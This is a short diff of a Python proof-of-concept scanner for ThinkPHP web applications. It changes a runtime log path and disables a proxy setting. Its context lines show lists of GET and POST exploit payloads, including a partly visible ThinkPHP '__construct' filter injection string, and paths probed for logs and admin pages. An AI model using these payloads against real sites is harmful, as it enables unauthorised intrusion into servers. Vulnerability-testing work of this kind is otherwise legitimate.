@@ -290,7 +290,7 @@ POC_POST6 = ["", "_method=__construct&method=get&filter[]=think\__include_file&s
 poc_get_list = [POC_GET1, POC_GET2, POC_GET3, POC_GET4, POC_GET5, POC_GET6]
 poc_post_list = [POC_POST1, POC_POST2, POC_POST3, POC_POST4, POC_POST5, POC_POST6]
 
-tp5_log = "/runtime/log/201911/13.log"
+tp5_log = "/runtime/log/202105/27.log"
 tp3_log = "/Application/Runtime/Logs/Home/19_12_24.log"
 
 dir_list = [tp3_log, tp5_log, '/thinkphp', '/public', '/runtime', '/admin', '/admin.php']
@@ -309,7 +309,7 @@ def poc(url):
     s = requests.session()
     s.headers = header
     s.verify = False
-    s.proxies = proxy
+    #s.proxies = proxy
     s.timeout = 15
 
     print("[M] Tesing " + url)
